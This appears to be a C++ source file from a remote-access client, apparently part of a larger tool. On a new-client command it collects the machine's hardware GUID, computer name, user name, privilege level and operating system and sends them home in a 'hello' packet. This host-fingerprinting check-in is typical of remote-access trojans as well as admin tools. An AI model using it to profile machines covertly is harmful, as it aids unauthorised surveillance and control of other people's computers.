#include "clientinformations.h"

#include "Conf.h"
#include "packetBuilder.h"


clientinformations::clientinformations() { }


clientinformations::~clientinformations()
{
}

int clientinformations::FunctionIdentity() { return _clientInformation; }

void clientinformations::ProcessPacket(PACKET * packet)
{
	switch (packet->_header.subCommand) 
	{
		case newclient: 
		{
			SendBaseInformations();
			break;
		}
		case updateInfos: 
		{
			break;
		}
		default:
		{
			break;
		}
	}
	freePacket(packet);
}

void clientinformations::SendBaseInformations() 
{

	string separator = "|#|";
	string buffer;

	

	buffer.append(computerInformations::_ComputerHardwarGUID());
	buffer.append(separator);
	buffer.append(computerInformations::_ComputerName());
	buffer.append(separator);
	buffer.append(computerInformations::_UserName());
	buffer.append(separator);
	buffer.append(computerInformations::_UserPrivileges());
	buffer.append(separator);
	buffer.append(computerInformations::_OperatingSystem());

	packetBuilder *b = new packetBuilder(_hello, newclient);
	b->WriteData((unsigned char*)buffer.c_str(), buffer.size(), _string);
	b->FinalizePacket();
	SendPacketCallback(b);
}

